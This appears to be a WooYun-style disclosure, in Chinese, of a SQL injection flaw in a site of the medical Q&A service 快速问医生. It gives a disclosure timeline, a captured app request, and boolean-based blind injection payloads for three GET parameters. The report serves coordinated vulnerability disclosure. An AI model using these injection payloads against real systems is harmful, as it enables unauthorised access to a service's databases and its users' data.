wybug_title: 快速问医生某站SQL注射漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-10-22：	细节已通知厂商并且等待厂商处理中									2015-10-23：	厂商已经确认，细节仅向厂商公开									2015-11-02：	细节向核心白帽子及相关领域专家公开									2015-11-12：	细节向普通白帽子公开									2015-11-22：	细节向实习白帽子公开									2015-12-07：	细节向公众公开  简要描述： 快速问医生某站SQL注射漏洞:P 详细说明：  
GET /common/lht?app=1&pos=0&os=a&token=562785a817d40&signature=72bc254bd98ae&once=1445430697 HTTP/1.1User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; MI 2S MIUI/JLB54.0)Host: iapp.120.netConnection: Keep-AliveAccept-Encoding: gzip
三个参数、
---Parameter: os (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: app=1&pos=0&os=a' AND 6032=6032 AND 'CVWl'='CVWl&token=562785a817d40&signature=72bc254bd98ae&once=1445430697Parameter: pos (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: app=1&pos=0 AND 6322=6322&os=a&token=562785a817d40&signature=72bc254bd98ae&once=1445430697Parameter: app (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: app=1 AND 7797=7797&pos=0&os=a&token=562785a817d40&signature=72bc254bd98ae&once=1445430697---
